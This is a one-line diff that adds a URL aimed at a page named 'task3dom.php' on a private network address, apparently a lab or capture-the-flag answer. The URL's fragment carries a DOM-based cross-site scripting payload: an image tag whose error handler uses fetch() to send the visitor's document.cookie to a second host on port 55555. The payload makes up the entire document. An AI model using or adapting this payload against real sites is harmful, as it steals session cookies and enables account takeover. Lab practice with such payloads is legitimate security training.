@@ -1,0 +1,1 @@
+http://192.168.1.203/task3dom.php?user=admin#%3Cimg%20src=%22x%22%20width=1%20height=1%20onerror=%22fetch(%60http://192.168.1.201:55555/${document.cookie}%60)%22%2f%3E
